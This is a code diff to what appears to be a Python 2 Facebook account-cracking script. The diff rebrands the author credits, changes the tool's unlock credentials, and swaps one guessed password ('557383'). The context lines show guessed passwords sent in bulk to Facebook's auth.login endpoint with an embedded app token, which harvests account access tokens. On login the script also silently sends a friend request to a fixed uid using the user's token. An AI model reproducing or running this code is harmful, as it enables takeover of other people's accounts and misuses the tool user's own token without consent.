@@ -49,17 +49,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - Asim-Pardasi------•◈•
-|__\~~) •||• M - Asim - CH---------------•◈•
+|__(~)    •||•MR - AHK-HACKER------•◈•
+|__\~~) •||• M - IJAZ -AFRIDI---------------•◈•
 |__(-----\  •◈•------I Love -Allah---------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mCH  Asim
-\033[1;96mInstagram \033[1;93m: \033[1;masimofficial
-\033[1;96mFacebook  \033[1;93m: \033[1; M Asim
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Asim02
+\033[1;96mAuthor  \033[1;93m: \033[1;92mIJAZ AFRIDI
+\033[1;96mInstagram \033[1;93m: \033[1;m/mrijazofficial1
+\033[1;96mFacebook  \033[1;93m: \033[1; M IJAZ
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Mrbadmash
 \033[1;91m======================================="""
 
 def tik():
@@ -80,16 +80,16 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;93mCH ASIM
-\033[1;96mInstagram \033[1;93m: \033[1;93mFlowAsim
-\033[1;96mFacebook  \033[1;93m: \033[1;93m M Asim
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Asim02
-\033[1;96mYoutub Channel \033[1;97m:Asim Pardasi
+\033[1;96mAuthor  \033[1;93m: \033[1;93mIJAZ AFRIDI
+\033[1;96mInstagram \033[1;93m: \033[1;93m/mrijazofficial1
+\033[1;96mFacebook  \033[1;93m: \033[1;93m M IJAZ
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Mrbadmash
+\033[1;96mYoutub Channel \033[1;97m:Mr Badmash Tricks
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "Asim"
-CorrectPassword = "009988"
+CorrectUsername = "afridi"
+CorrectPassword = "afridi"
 
 loop = 'true'
 while (loop == 'true'):
@@ -101,10 +101,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 
 def login():
 	os.system('clear')
@@ -145,7 +145,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+				os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -345,7 +345,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = '557383'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
